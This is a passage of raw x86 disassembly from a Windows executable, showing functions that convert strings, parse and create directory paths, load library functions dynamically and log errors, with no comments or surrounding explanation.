  40e7eb:	lea    eax,[ebp-0x204]
  40e7f1:	mov    ecx,esi
  40e7f3:	push   eax
  40e7f4:	push   0xc
  40e7f6:	push   DWORD PTR [ebp+0x8]
  40e7f9:	call   DWORD PTR ds:0x414220
  40e7ff:	call   esi
  40e801:	add    esp,0xc
  40e804:	pop    esi
  40e805:	mov    ecx,DWORD PTR [ebp-0x4]
  40e808:	xor    ecx,ebp
  40e80a:	call   0x411980
  40e80f:	mov    esp,ebp
  40e811:	pop    ebp
  40e812:	ret    
  40e813:	int3   
  40e814:	int3   
  40e815:	int3   
  40e816:	int3   
  40e817:	int3   
  40e818:	mov    edi,edi
  40e81a:	push   ebp
  40e81b:	mov    ebp,esp
  40e81d:	sub    esp,0x604
  40e823:	mov    eax,ds:0x413004
  40e828:	xor    eax,ebp
  40e82a:	mov    DWORD PTR [ebp-0x4],eax
  40e82d:	push   0x5ff
  40e832:	lea    eax,[ebp-0x603]
  40e838:	mov    BYTE PTR [ebp-0x604],0x0
  40e83f:	push   0x0
  40e841:	push   eax
  40e842:	call   0x412060
  40e847:	add    esp,0xc
  40e84a:	lea    eax,[ebp+0x10]
  40e84d:	lea    ecx,[ebp-0x604]
  40e853:	push   eax
  40e854:	push   DWORD PTR [ebp+0xc]
  40e857:	call   0x40e907
  40e85c:	cmp    DWORD PTR [ebp+0x8],0xffffffff
  40e860:	je     0x40e897
  40e862:	push   esi
  40e863:	mov    esi,DWORD PTR ds:0x4138e8
  40e869:	test   esi,esi
  40e86b:	je     0x40e896
  40e86d:	mov    edx,0x600
  40e872:	lea    ecx,[ebp-0x604]
  40e878:	call   0x40e705
  40e87d:	lea    eax,[ebp-0x604]
  40e883:	mov    ecx,esi
  40e885:	push   eax
  40e886:	push   0xc
  40e888:	push   DWORD PTR [ebp+0x8]
  40e88b:	call   DWORD PTR ds:0x414220
  40e891:	call   esi
  40e893:	add    esp,0xc
  40e896:	pop    esi
  40e897:	mov    ecx,DWORD PTR [ebp-0x4]
  40e89a:	xor    ecx,ebp
  40e89c:	call   0x411980
  40e8a1:	mov    esp,ebp
  40e8a3:	pop    ebp
  40e8a4:	ret    
  40e8a5:	int3   
  40e8a6:	int3   
  40e8a7:	int3   
  40e8a8:	int3   
  40e8a9:	int3   
  40e8aa:	test   ecx,ecx
  40e8ac:	je     0x40e901
  40e8ae:	xor    edx,edx
  40e8b0:	cmp    BYTE PTR [ecx],dl
  40e8b2:	je     0x40e901
  40e8b4:	mov    al,BYTE PTR [ecx]
  40e8b6:	cmp    al,0x25
  40e8b8:	je     0x40e8f2
  40e8ba:	cmp    al,0x43
  40e8bc:	je     0x40e8e9
  40e8be:	cmp    al,0x53
  40e8c0:	je     0x40e8e0
  40e8c2:	cmp    al,0x63
  40e8c4:	je     0x40e8d7
  40e8c6:	cmp    al,0x73
  40e8c8:	je     0x40e8ce
  40e8ca:	xor    edx,edx
  40e8cc:	jmp    0x40e8fb
  40e8ce:	test   edx,edx
  40e8d0:	je     0x40e8fb
  40e8d2:	mov    BYTE PTR [ecx],0x53
  40e8d5:	jmp    0x40e8fb
  40e8d7:	test   edx,edx
  40e8d9:	je     0x40e8fb
  40e8db:	mov    BYTE PTR [ecx],0x43
  40e8de:	jmp    0x40e8fb
  40e8e0:	test   edx,edx
  40e8e2:	je     0x40e8fb
  40e8e4:	mov    BYTE PTR [ecx],0x73
  40e8e7:	jmp    0x40e8fb
  40e8e9:	test   edx,edx
  40e8eb:	je     0x40e8fb
  40e8ed:	mov    BYTE PTR [ecx],0x63
  40e8f0:	jmp    0x40e8fb
  40e8f2:	xor    eax,eax
  40e8f4:	test   edx,edx
  40e8f6:	sete   al
  40e8f9:	mov    edx,eax
  40e8fb:	inc    ecx
  40e8fc:	cmp    BYTE PTR [ecx],0x0
  40e8ff:	jne    0x40e8b4
  40e901:	ret    
  40e902:	int3   
  40e903:	int3   
  40e904:	int3   
  40e905:	int3   
  40e906:	int3   
  40e907:	mov    edi,edi
  40e909:	push   ebp
  40e90a:	mov    ebp,esp
  40e90c:	push   ecx
  40e90d:	push   ecx
  40e90e:	push   esi
  40e90f:	mov    eax,ecx
  40e911:	xor    esi,esi
  40e913:	mov    DWORD PTR [ebp-0x8],eax
  40e916:	push   edi
  40e917:	mov    edi,esi
  40e919:	test   eax,eax
  40e91b:	je     0x40e997
  40e91d:	push   ebx
  40e91e:	mov    ebx,DWORD PTR [ebp+0x8]
  40e921:	test   ebx,ebx
  40e923:	je     0x40e996
  40e925:	xor    eax,eax
  40e927:	cmp    ax,WORD PTR [ebx]
  40e92a:	je     0x40e996
  40e92c:	push   esi
  40e92d:	push   esi
  40e92e:	push   esi
  40e92f:	push   esi
  40e930:	push   0xffffffff
  40e932:	push   ebx
  40e933:	push   0x400
  40e938:	push   esi
  40e939:	call   DWORD PTR ds:0x4140e8
  40e93f:	mov    DWORD PTR [ebp-0x4],eax
  40e942:	test   eax,eax
  40e944:	je     0x40e996
  40e946:	push   eax
  40e947:	push   0x40
  40e949:	call   DWORD PTR ds:0x4140e0
  40e94f:	mov    edi,eax
  40e951:	test   edi,edi
  40e953:	je     0x40e996
  40e955:	push   esi
  40e956:	push   esi
  40e957:	push   DWORD PTR [ebp-0x4]
  40e95a:	push   edi
  40e95b:	push   0xffffffff
  40e95d:	push   ebx
  40e95e:	push   0x400
  40e963:	push   esi
  40e964:	call   DWORD PTR ds:0x4140e8
  40e96a:	test   eax,eax
  40e96c:	je     0x40e996
  40e96e:	mov    ecx,edi
  40e970:	call   0x40e8aa
  40e975:	push   DWORD PTR [ebp+0xc]
  40e978:	mov    ebx,DWORD PTR [ebp-0x8]
  40e97b:	mov    edx,0x600
  40e980:	push   edi
  40e981:	push   esi
  40e982:	mov    ecx,ebx
  40e984:	call   0x40e4e9
  40e989:	test   eax,eax
  40e98b:	js     0x40e996
  40e98d:	push   ebx
  40e98e:	call   DWORD PTR ds:0x414094
  40e994:	mov    esi,eax
  40e996:	pop    ebx
  40e997:	push   edi
  40e998:	call   DWORD PTR ds:0x4140b0
  40e99e:	pop    edi
  40e99f:	mov    eax,esi
  40e9a1:	pop    esi
  40e9a2:	mov    esp,ebp
  40e9a4:	pop    ebp
  40e9a5:	ret    0x8
  40e9a8:	int3   
  40e9a9:	int3   
  40e9aa:	int3   
  40e9ab:	int3   
  40e9ac:	int3   
  40e9ad:	mov    edi,edi
  40e9af:	push   ebp
  40e9b0:	mov    ebp,esp
  40e9b2:	sub    esp,0x424
  40e9b8:	mov    eax,ds:0x413004
  40e9bd:	xor    eax,ebp
  40e9bf:	mov    DWORD PTR [ebp-0x4],eax
  40e9c2:	push   ebx
  40e9c3:	push   esi
  40e9c4:	xor    esi,esi
  40e9c6:	mov    DWORD PTR [ebp-0x424],ecx
  40e9cc:	mov    edx,ecx
  40e9ce:	inc    esi
  40e9cf:	xor    eax,eax
  40e9d1:	push   edi
  40e9d2:	mov    DWORD PTR [ebp-0x420],eax
  40e9d8:	mov    ebx,eax
  40e9da:	lea    edi,[edx+0x2]
  40e9dd:	mov    ax,WORD PTR [edx]
  40e9e0:	add    edx,0x2
  40e9e3:	cmp    ax,WORD PTR [ebp-0x420]
  40e9ea:	jne    0x40e9dd
  40e9ec:	sub    edx,edi
  40e9ee:	sar    edx,1
  40e9f0:	push   0x5c
  40e9f2:	pop    edi
  40e9f3:	cmp    edx,0x2
  40e9f6:	jbe    0x40ea47
  40e9f8:	movzx  eax,WORD PTR [ecx+0x2]
  40e9fc:	cmp    eax,0x3a
  40e9ff:	jne    0x40ea0d
  40ea01:	xor    ebx,ebx
  40ea03:	cmp    WORD PTR [ecx+0x4],di
  40ea07:	sete   bl
  40ea0a:	inc    ebx
  40ea0b:	jmp    0x40ea47
  40ea0d:	cmp    WORD PTR [ecx],di
  40ea10:	jne    0x40ea47
  40ea12:	cmp    ax,di
  40ea15:	jne    0x40ea44
  40ea17:	push   0x2
  40ea19:	pop    ebx
  40ea1a:	xor    eax,eax
  40ea1c:	cmp    edx,ebx
  40ea1e:	jbe    0x40ea31
  40ea20:	cmp    WORD PTR [ecx+ebx*2],di
  40ea24:	jne    0x40ea2c
  40ea26:	inc    eax
  40ea27:	cmp    eax,0x2
  40ea2a:	je     0x40ea47
  40ea2c:	inc    ebx
  40ea2d:	cmp    ebx,edx
  40ea2f:	jb     0x40ea20
  40ea31:	mov    ecx,DWORD PTR [ebp-0x4]
  40ea34:	mov    eax,esi
  40ea36:	pop    edi
  40ea37:	pop    esi
  40ea38:	xor    ecx,ebp
  40ea3a:	pop    ebx
  40ea3b:	call   0x411980
  40ea40:	mov    esp,ebp
  40ea42:	pop    ebp
  40ea43:	ret    
  40ea44:	xor    ebx,ebx
  40ea46:	inc    ebx
  40ea47:	lea    eax,[edx-0x1]
  40ea4a:	xor    esi,esi
  40ea4c:	mov    DWORD PTR [ebp-0x420],eax
  40ea52:	cmp    ebx,eax
  40ea54:	jae    0x40ea5d
  40ea56:	inc    ebx
  40ea57:	cmp    WORD PTR [ecx+ebx*2],di
  40ea5b:	jne    0x40ea52
  40ea5d:	xor    eax,eax
  40ea5f:	push   0x208
  40ea64:	mov    WORD PTR [ebp-0x41c],ax
  40ea6b:	lea    eax,[ebp-0x41a]
  40ea71:	push   esi
  40ea72:	push   eax
  40ea73:	call   0x412060
  40ea78:	add    esp,0xc
  40ea7b:	lea    eax,[ebp-0x41c]
  40ea81:	push   eax
  40ea82:	push   0x105
  40ea87:	call   DWORD PTR ds:0x41408c
  40ea8d:	test   eax,eax
  40ea8f:	je     0x40ea31
  40ea91:	xor    eax,eax
  40ea93:	push   0x208
  40ea98:	mov    WORD PTR [ebp-0x210],ax
  40ea9f:	lea    eax,[ebp-0x20e]
  40eaa5:	push   esi
  40eaa6:	push   eax
  40eaa7:	call   0x412060
  40eaac:	add    esp,0xc
  40eaaf:	mov    edx,0x105
  40eab4:	push   0x900
  40eab9:	push   ecx
  40eaba:	push   ecx
  40eabb:	push   DWORD PTR [ebp-0x424]
  40eac1:	lea    ecx,[ebp-0x210]
  40eac7:	call   0x410ebe
  40eacc:	test   eax,eax
  40eace:	js     0x40ea31
  40ead4:	lea    eax,[ebx+0x1]
  40ead7:	cmp    eax,0x105
  40eadc:	jae    0x40ea31
  40eae2:	lea    eax,[ebx*2+0x2]
  40eae9:	cmp    eax,0x20a
  40eaee:	jae    0x40eb5b
  40eaf0:	xor    ecx,ecx
  40eaf2:	mov    WORD PTR [ebp+eax*1-0x210],cx
  40eafa:	lea    eax,[ebp-0x210]
  40eb00:	push   eax
  40eb01:	call   DWORD PTR ds:0x4140d8
  40eb07:	test   eax,eax
  40eb09:	jne    0x40eb32
  40eb0b:	push   esi
  40eb0c:	lea    eax,[ebp-0x210]
  40eb12:	push   eax
  40eb13:	call   DWORD PTR ds:0x4140dc
  40eb19:	mov    esi,eax
  40eb1b:	test   esi,esi
  40eb1d:	jne    0x40eb30
  40eb1f:	call   DWORD PTR ds:0x414074
  40eb25:	cmp    eax,0xb7
  40eb2a:	jne    0x40ea31
  40eb30:	xor    esi,esi
  40eb32:	lea    eax,[ebp-0x41c]
  40eb38:	push   eax
  40eb39:	call   DWORD PTR ds:0x4140d8
  40eb3f:	mov    eax,DWORD PTR [ebp-0x420]
  40eb45:	mov    ecx,DWORD PTR [ebp-0x424]
  40eb4b:	cmp    ebx,eax
  40eb4d:	jb     0x40ea56
  40eb53:	xor    esi,esi
  40eb55:	inc    esi
  40eb56:	jmp    0x40ea31
  40eb5b:	call   0x411ad9
  40eb60:	int3   
  40eb61:	int3   
  40eb62:	int3   
  40eb63:	int3   
  40eb64:	int3   
  40eb65:	int3   
  40eb66:	mov    edi,edi
  40eb68:	push   ebp
  40eb69:	mov    ebp,esp
  40eb6b:	sub    esp,0x10
  40eb6e:	cmp    DWORD PTR [ebp+0x8],0x0
  40eb72:	push   ebx
  40eb73:	mov    ebx,ecx
  40eb75:	je     0x40ed39
  40eb7b:	push   esi
  40eb7c:	push   edi
  40eb7d:	push   0x20a
  40eb82:	xor    esi,esi
  40eb84:	push   esi
  40eb85:	push   ebx
  40eb86:	mov    DWORD PTR [ebp-0x10],esi
  40eb89:	call   0x412060
  40eb8e:	xor    eax,eax
  40eb90:	lea    edi,[ebx+0x20a]
  40eb96:	stos   DWORD PTR es:[edi],eax
  40eb97:	stos   DWORD PTR es:[edi],eax
  40eb98:	stos   WORD PTR es:[edi],ax
  40eb9a:	lea    eax,[ebx+0x214]
  40eba0:	mov    edi,0x202
  40eba5:	push   edi
  40eba6:	push   esi
  40eba7:	push   eax
  40eba8:	call   0x412060
  40ebad:	push   edi
  40ebae:	lea    eax,[ebx+0x416]
  40ebb4:	push   esi
  40ebb5:	push   eax
  40ebb6:	call   0x412060
  40ebbb:	push   edi
  40ebbc:	lea    eax,[ebx+0x618]
  40ebc2:	push   esi
  40ebc3:	push   eax
  40ebc4:	call   0x412060
  40ebc9:	mov    ecx,DWORD PTR [ebp+0x8]
  40ebcc:	add    esp,0x30
  40ebcf:	xor    eax,eax
  40ebd1:	mov    DWORD PTR [ebp-0x4],ecx
  40ebd4:	mov    edx,0x105
  40ebd9:	mov    DWORD PTR [ebp-0xc],eax
  40ebdc:	mov    esi,ebx
  40ebde:	mov    DWORD PTR [ebp-0x8],eax
  40ebe1:	push   0x900
  40ebe6:	push   ecx
  40ebe7:	push   ecx
  40ebe8:	push   ecx
  40ebe9:	mov    ecx,ebx
  40ebeb:	mov    edi,ebx
  40ebed:	call   0x410ebe
  40ebf2:	test   eax,eax
  40ebf4:	js     0x40ed37
  40ebfa:	mov    ecx,DWORD PTR [ebp+0x8]
  40ebfd:	xor    eax,eax
  40ebff:	cmp    ax,WORD PTR [ecx]
  40ec02:	je     0x40ed20
  40ec08:	mov    edx,ecx
  40ec0a:	mov    eax,edx
  40ec0c:	sub    eax,ecx
  40ec0e:	and    eax,0xfffffffe
  40ec11:	cmp    eax,0x208
  40ec16:	jg     0x40ecb4
  40ec1c:	movzx  eax,WORD PTR [edx]
  40ec1f:	sub    eax,0x2e
  40ec22:	je     0x40ec8d
  40ec24:	sub    eax,0x1
  40ec27:	je     0x40ec33
  40ec29:	sub    eax,0xb
  40ec2c:	je     0x40ec38
  40ec2e:	sub    eax,0x22
  40ec31:	jne    0x40ec90
  40ec33:	mov    DWORD PTR [ebp-0x10],edi
  40ec36:	jmp    0x40ec90
  40ec38:	cmp    DWORD PTR [ebp-0xc],0x0
  40ec3c:	jne    0x40ed37
  40ec42:	cmp    edi,ebx
  40ec44:	je     0x40ed37
  40ec4a:	push   edi
  40ec4b:	push   ebx
  40ec4c:	call   DWORD PTR ds:0x414178
  40ec52:	cmp    ebx,eax
  40ec54:	jne    0x40ed37
  40ec5a:	sub    esp,0xc
  40ec5d:	mov    DWORD PTR [ebp-0xc],edi
  40ec60:	mov    eax,edi
  40ec62:	lea    ecx,[ebx+0x20a]
  40ec68:	sub    eax,esi
  40ec6a:	sar    eax,1
  40ec6c:	inc    eax
  40ec6d:	push   eax
  40ec6e:	push   esi
  40ec6f:	push   0x5
  40ec71:	pop    edx
  40ec72:	call   0x410ef7
  40ec77:	test   eax,eax
  40ec79:	js     0x40ed37
  40ec7f:	push   edi
  40ec80:	call   DWORD PTR ds:0x414184
  40ec86:	mov    edx,DWORD PTR [ebp-0x4]
  40ec89:	mov    esi,eax
  40ec8b:	jmp    0x40ec90
  40ec8d:	mov    DWORD PTR [ebp-0x8],edi
  40ec90:	push   edx
  40ec91:	call   DWORD PTR ds:0x414184
  40ec97:	push   edi
  40ec98:	mov    DWORD PTR [ebp-0x4],eax
  40ec9b:	call   DWORD PTR ds:0x414184
  40eca1:	mov    edx,DWORD PTR [ebp-0x4]
  40eca4:	mov    edi,eax
  40eca6:	mov    ecx,DWORD PTR [ebp+0x8]
  40eca9:	xor    eax,eax
  40ecab:	cmp    ax,WORD PTR [edx]
  40ecae:	jne    0x40ec0a
  40ecb4:	mov    edi,DWORD PTR [ebp-0x10]
  40ecb7:	test   edi,edi
  40ecb9:	je     0x40ece4
  40ecbb:	sub    esp,0xc
  40ecbe:	lea    ecx,[ebx+0x214]
  40ecc4:	mov    eax,edi
  40ecc6:	mov    edx,0x101
  40eccb:	sub    eax,esi
  40eccd:	sar    eax,1
  40eccf:	inc    eax
  40ecd0:	push   eax
  40ecd1:	push   esi
  40ecd2:	call   0x410ef7
  40ecd7:	test   eax,eax
  40ecd9:	js     0x40ed37
  40ecdb:	push   edi
  40ecdc:	call   DWORD PTR ds:0x414184
  40ece2:	mov    esi,eax
  40ece4:	mov    eax,DWORD PTR [ebp-0x8]
  40ece7:	test   eax,eax
  40ece9:	je     0x40ed20
  40eceb:	cmp    eax,edi
  40eced:	jbe    0x40ed20
  40ecef:	sub    esp,0xc
  40ecf2:	lea    ecx,[ebx+0x416]
  40ecf8:	sub    eax,esi
  40ecfa:	sar    eax,1
  40ecfc:	push   eax
  40ecfd:	push   esi
  40ecfe:	mov    esi,0x101
  40ed03:	mov    edx,esi
  40ed05:	call   0x410ef7
  40ed0a:	test   eax,eax
  40ed0c:	js     0x40ed37
  40ed0e:	mov    eax,DWORD PTR [ebp-0x8]
  40ed11:	lea    ecx,[ebx+0x618]
  40ed17:	sub    esp,0xc
  40ed1a:	mov    edx,esi
  40ed1c:	push   esi
  40ed1d:	push   eax
  40ed1e:	jmp    0x40ed32
  40ed20:	sub    esp,0xc
  40ed23:	lea    ecx,[ebx+0x416]
  40ed29:	mov    eax,0x101
  40ed2e:	mov    edx,eax
  40ed30:	push   eax
  40ed31:	push   esi
  40ed32:	call   0x410ef7
  40ed37:	pop    edi
  40ed38:	pop    esi
  40ed39:	mov    eax,ebx
  40ed3b:	pop    ebx
  40ed3c:	mov    esp,ebp
  40ed3e:	pop    ebp
  40ed3f:	ret    0x4
  40ed42:	int3   
  40ed43:	int3   
  40ed44:	int3   
  40ed45:	int3   
  40ed46:	int3   
  40ed47:	mov    edi,edi
  40ed49:	push   ebp
  40ed4a:	mov    ebp,esp
  40ed4c:	sub    esp,0x944
  40ed52:	mov    eax,ds:0x413004
  40ed57:	xor    eax,ebp
  40ed59:	mov    DWORD PTR [ebp-0x4],eax
  40ed5c:	mov    eax,DWORD PTR [ebp+0x8]
  40ed5f:	push   ebx
  40ed60:	push   esi
  40ed61:	push   edi
  40ed62:	mov    ebx,ecx
  40ed64:	mov    DWORD PTR [ebp-0x93c],edx
  40ed6a:	push   0x40447c
  40ed6f:	mov    DWORD PTR [ebp-0x944],ebx
  40ed75:	mov    DWORD PTR [ebp-0x940],eax
  40ed7b:	call   DWORD PTR ds:0x4140a0
  40ed81:	mov    edi,eax
  40ed83:	test   edi,edi
  40ed85:	jne    0x40edbc
  40ed87:	call   DWORD PTR ds:0x414074
  40ed8d:	mov    esi,eax
  40ed8f:	test   esi,esi
  40ed91:	jle    0x40ed9c
  40ed93:	movzx  esi,si
  40ed96:	or     esi,0x80070000
  40ed9c:	push   esi
  40ed9d:	push   0x404494
  40eda2:	push   0x4044b8
  40eda7:	push   DWORD PTR ds:0x4130e8
  40edad:	call   0x40e818
  40edb2:	add    esp,0x10
  40edb5:	mov    eax,esi
  40edb7:	jmp    0x40ef86
  40edbc:	push   0x404494
  40edc1:	push   edi
  40edc2:	call   DWORD PTR ds:0x414048
  40edc8:	mov    DWORD PTR [ebp-0x938],eax
  40edce:	test   eax,eax
  40edd0:	jne    0x40ee09
  40edd2:	call   DWORD PTR ds:0x414074
  40edd8:	mov    esi,eax
  40edda:	test   esi,esi
  40eddc:	jle    0x40ede7
  40edde:	movzx  esi,si
  40ede1:	or     esi,0x80070000
  40ede7:	push   esi
  40ede8:	push   0x40447c
  40eded:	push   0x404528
  40edf2:	push   DWORD PTR ds:0x4130e8
  40edf8:	call   0x40e818
  40edfd:	add    esp,0x10
  40ee00:	push   edi
  40ee01:	call   DWORD PTR ds:0x414120
  40ee07:	jmp    0x40edb5
  40ee09:	xor    eax,eax
  40ee0b:	lea    ecx,[ebp-0x928]
  40ee11:	cmp    DWORD PTR [ebp+0xc],eax
  40ee14:	push   ebx
  40ee15:	setne  al
  40ee18:	lea    eax,[eax*4+0x1]
  40ee1f:	mov    DWORD PTR [ebp-0x930],eax
  40ee25:	call   0x40eb66
  40ee2a:	lea    eax,[ebp-0x714]
  40ee30:	xor    esi,esi
  40ee32:	push   eax
  40ee33:	lea    eax,[ebp-0x71e]
  40ee39:	mov    ebx,0x105
  40ee3e:	push   eax
  40ee3f:	push   0x404594
  40ee44:	push   0x900
  40ee49:	push   esi
  40ee4a:	push   esi
  40ee4b:	lea    eax,[ebp-0x10c]
  40ee51:	push   ebx
  40ee52:	push   eax
  40ee53:	call   0x410fdd
  40ee58:	add    esp,0x20
  40ee5b:	mov    DWORD PTR [ebp-0x934],esi
  40ee61:	push   ebx
  40ee62:	call   DWORD PTR ds:0x4141b0
  40ee68:	push   ebx
  40ee69:	mov    DWORD PTR [ebp-0x92c],eax
  40ee6f:	call   DWORD PTR ds:0x4141b0
  40ee75:	push   ebx
  40ee76:	mov    esi,eax
  40ee78:	call   DWORD PTR ds:0x4141b0
  40ee7e:	mov    ebx,eax
  40ee80:	mov    eax,DWORD PTR [ebp-0x92c]
  40ee86:	test   eax,eax
  40ee88:	je     0x40ef65
  40ee8e:	test   esi,esi
  40ee90:	je     0x40ef65
  40ee96:	test   ebx,ebx
  40ee98:	je     0x40ef65
  40ee9e:	xor    ecx,ecx
  40eea0:	push   ecx
  40eea1:	push   ecx
  40eea2:	push   0x104
  40eea7:	push   eax
  40eea8:	push   0xffffffff
  40eeaa:	push   DWORD PTR [ebp-0x944]
  40eeb0:	push   0x400
  40eeb5:	push   ecx
  40eeb6:	call   DWORD PTR ds:0x4140e8
  40eebc:	xor    eax,eax
  40eebe:	push   eax
  40eebf:	push   eax
  40eec0:	push   0x104
  40eec5:	push   esi
  40eec6:	push   0xffffffff
  40eec8:	push   DWORD PTR [ebp-0x93c]
  40eece:	push   0x400
  40eed3:	push   eax
  40eed4:	call   DWORD PTR ds:0x4140e8
  40eeda:	xor    eax,eax
  40eedc:	push   eax
  40eedd:	push   eax
  40eede:	push   0x104
  40eee3:	push   ebx
  40eee4:	push   0xffffffff
  40eee6:	push   DWORD PTR [ebp-0x940]
  40eeec:	push   0x400
  40eef1:	push   eax
  40eef2:	call   DWORD PTR ds:0x4140e8
  40eef8:	xor    ecx,ecx
  40eefa:	lea    eax,[ebp-0x934]
  40ef00:	push   ecx
  40ef01:	push   DWORD PTR [ebp-0x930]
  40ef07:	push   eax
  40ef08:	push   ebx
  40ef09:	lea    eax,[ebp-0x10c]
  40ef0f:	push   eax
  40ef10:	push   esi
  40ef11:	push   DWORD PTR [ebp-0x92c]
  40ef17:	push   ecx
  40ef18:	mov    ecx,DWORD PTR [ebp-0x938]
  40ef1e:	call   DWORD PTR ds:0x414220
  40ef24:	call   DWORD PTR [ebp-0x938]
  40ef2a:	push   DWORD PTR [ebp-0x934]
  40ef30:	mov    DWORD PTR [ebp-0x930],eax
  40ef36:	call   DWORD PTR ds:0x414084
  40ef3c:	push   DWORD PTR [ebp-0x92c]
  40ef42:	call   DWORD PTR ds:0x4141bc
  40ef48:	push   esi
  40ef49:	call   DWORD PTR ds:0x4141bc
  40ef4f:	push   ebx
  40ef50:	call   DWORD PTR ds:0x4141bc
  40ef56:	push   edi
  40ef57:	call   DWORD PTR ds:0x414120
  40ef5d:	mov    eax,DWORD PTR [ebp-0x930]
  40ef63:	jmp    0x40ef86
  40ef65:	push   eax
  40ef66:	call   DWORD PTR ds:0x4141bc
  40ef6c:	push   esi
  40ef6d:	call   DWORD PTR ds:0x4141bc
  40ef73:	push   ebx
  40ef74:	call   DWORD PTR ds:0x4141bc
  40ef7a:	push   edi
  40ef7b:	call   DWORD PTR ds:0x414120
  40ef81:	mov    eax,0x8007000e
  40ef86:	mov    ecx,DWORD PTR [ebp-0x4]
  40ef89:	pop    edi
  40ef8a:	pop    esi
  40ef8b:	xor    ecx,ebp
  40ef8d:	pop    ebx
  40ef8e:	call   0x411980
  40ef93:	mov    esp,ebp
  40ef95:	pop    ebp
  40ef96:	ret    0x8
  40ef99:	int3   
  40ef9a:	int3   
  40ef9b:	int3   
  40ef9c:	int3   
  40ef9d:	int3   
  40ef9e:	mov    edi,edi
  40efa0:	push   ebp
  40efa1:	mov    ebp,esp
  40efa3:	sub    esp,0xc
  40efa6:	mov    eax,ds:0x413004
  40efab:	xor    eax,ebp
  40efad:	mov    DWORD PTR [ebp-0x4],eax
  40efb0:	push   ebx
  40efb1:	push   esi
  40efb2:	mov    ebx,ecx
  40efb4:	push   edi
  40efb5:	mov    edi,edx
  40efb7:	test   ebx,ebx
  40efb9:	je     0x40f10c
  40efbf:	test   edi,edi
  40efc1:	je     0x40f10c
  40efc7:	cmp    BYTE PTR [ebx],0x0
  40efca:	je     0x40f10c
  40efd0:	cmp    BYTE PTR [edi],0x0
  40efd3:	je     0x40f10c
  40efd9:	and    DWORD PTR [ebp-0xc],0x0
  40efdd:	push   ebx
  40efde:	call   DWORD PTR ds:0x414094
  40efe4:	push   edi
  40efe5:	mov    esi,eax
  40efe7:	call   DWORD PTR ds:0x414094
  40efed:	add    eax,0xd
  40eff0:	add    esi,eax
  40eff2:	push   esi
  40eff3:	call   DWORD PTR ds:0x4141b0
  40eff9:	mov    DWORD PTR [ebp-0x8],eax
  40effc:	test   eax,eax
  40effe:	jne    0x40f00a
  40f000:	mov    eax,0x8007000e
  40f005:	jmp    0x40f111
  40f00a:	push   DWORD PTR [ebp+0x8]
  40f00d:	push   edi
  40f00e:	push   ebx
  40f00f:	push   0x40459c
  40f014:	push   0x900
  40f019:	push   0x0
  40f01b:	push   0x0
  40f01d:	push   esi
  40f01e:	push   eax
  40f01f:	call   0x410fdd
  40f024:	mov    esi,eax
  40f026:	add    esp,0x24
  40f029:	test   esi,esi
  40f02b:	js     0x40f0f1
  40f031:	push   0x40447c
  40f036:	call   DWORD PTR ds:0x4140a0
  40f03c:	mov    DWORD PTR [ebp-0xc],eax
  40f03f:	test   eax,eax
  40f041:	jne    0x40f070
  40f043:	call   DWORD PTR ds:0x414074
  40f049:	mov    esi,eax
  40f04b:	test   esi,esi
  40f04d:	jle    0x40f058
  40f04f:	movzx  esi,si
  40f052:	or     esi,0x80070000
  40f058:	push   esi
  40f059:	push   0x40447c
  40f05e:	push   0x404528
  40f063:	push   DWORD PTR ds:0x4130e8
  40f069:	call   0x40e818
  40f06e:	jmp    0x40f0ee
  40f070:	push   0x4044a4
  40f075:	push   eax
  40f076:	call   DWORD PTR ds:0x414048
  40f07c:	mov    esi,eax
  40f07e:	test   esi,esi
  40f080:	jne    0x40f0a4
  40f082:	call   DWORD PTR ds:0x414074
  40f088:	mov    esi,eax
  40f08a:	test   esi,esi
  40f08c:	jle    0x40f097
  40f08e:	movzx  esi,si
  40f091:	or     esi,0x80070000
  40f097:	push   esi
  40f098:	push   0x404494
  40f09d:	push   0x4044b8
  40f0a2:	jmp    0x40f063
  40f0a4:	xor    eax,eax
  40f0a6:	mov    ecx,esi
  40f0a8:	push   eax
  40f0a9:	push   DWORD PTR [ebp-0x8]
  40f0ac:	push   eax
  40f0ad:	push   eax
  40f0ae:	call   DWORD PTR ds:0x414220
  40f0b4:	call   esi
  40f0b6:	mov    esi,eax
  40f0b8:	test   esi,esi
  40f0ba:	jns    0x40f0d4
  40f0bc:	push   esi
  40f0bd:	push   edi
  40f0be:	push   ebx
  40f0bf:	push   0x4045a8
  40f0c4:	push   DWORD PTR ds:0x4130e8
  40f0ca:	call   0x40e7a0
  40f0cf:	add    esp,0x14
  40f0d2:	jmp    0x40f0f1
  40f0d4:	cmp    esi,0xbc2
  40f0da:	jne    0x40f0f1
  40f0dc:	push   edi
  40f0dd:	push   ebx
  40f0de:	push   0x404600
  40f0e3:	push   DWORD PTR ds:0x4130e8
  40f0e9:	call   0x40e7a0
  40f0ee:	add    esp,0x10
  40f0f1:	push   DWORD PTR [ebp-0x8]
  40f0f4:	call   DWORD PTR ds:0x4141bc
  40f0fa:	mov    eax,DWORD PTR [ebp-0xc]
  40f0fd:	test   eax,eax
  40f0ff:	je     0x40f108
  40f101:	push   eax
  40f102:	call   DWORD PTR ds:0x414120
  40f108:	mov    eax,esi
  40f10a:	jmp    0x40f111
  40f10c:	mov    eax,0x80070057
  40f111:	mov    ecx,DWORD PTR [ebp-0x4]
  40f114:	pop    edi
  40f115:	pop    esi
  40f116:	xor    ecx,ebp
  40f118:	pop    ebx
  40f119:	call   0x411980
  40f11e:	mov    esp,ebp
  40f120:	pop    ebp
  40f121:	ret    0x4
  40f124:	int3   
  40f125:	int3   
  40f126:	int3   
  40f127:	int3   
  40f128:	int3   
  40f129:	mov    edi,edi
  40f12b:	push   ebp
  40f12c:	mov    ebp,esp
  40f12e:	sub    esp,0x18
  40f131:	mov    eax,ds:0x413004
  40f136:	xor    eax,ebp
  40f138:	mov    DWORD PTR [ebp-0x4],eax
  40f13b:	push   ebx
  40f13c:	push   esi
  40f13d:	push   0x0
  40f13f:	push   0x0
  40f141:	push   0x404664
  40f146:	mov    DWORD PTR [ebp-0x8],ecx
  40f149:	mov    ebx,0x80004005
  40f14e:	call   DWORD PTR ds:0x41411c
  40f154:	mov    esi,eax
  40f156:	test   esi,esi
  40f158:	jne    0x40f176
  40f15a:	call   DWORD PTR ds:0x414074
  40f160:	push   eax
  40f161:	push   0x404678
  40f166:	push   DWORD PTR ds:0x4130e8
  40f16c:	call   0x40e818
  40f171:	add    esp,0xc
  40f174:	jmp    0x40f1ea
  40f176:	push   edi
  40f177:	push   0x4046fc
  40f17c:	push   esi
  40f17d:	call   DWORD PTR ds:0x414048
  40f183:	mov    edi,eax
  40f185:	test   edi,edi
  40f187:	jne    0x40f1a5
